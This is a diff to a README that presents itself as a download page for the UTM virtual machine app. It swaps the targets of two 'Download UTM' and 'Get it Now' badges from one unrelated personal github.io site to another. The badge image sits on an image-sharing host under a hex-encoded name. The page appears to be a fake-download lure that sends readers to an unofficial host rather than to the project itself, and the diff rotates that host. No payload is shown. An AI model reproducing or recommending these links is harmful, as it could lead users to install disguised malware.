@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://gunbpx.github.io/.github/uTM">
+  <a href="https://maopolo-sot.github.io/.github/uTM">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download UTM"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The QEMU emulation breadth is UTM's distinctive technical capability beyond comm
 
 <p align="center">
 
-[![Get it Now UTM](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://gunbpx.github.io/.github/uTM)
+[![Get it Now UTM](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://maopolo-sot.github.io/.github/uTM)
 
 </p>
 
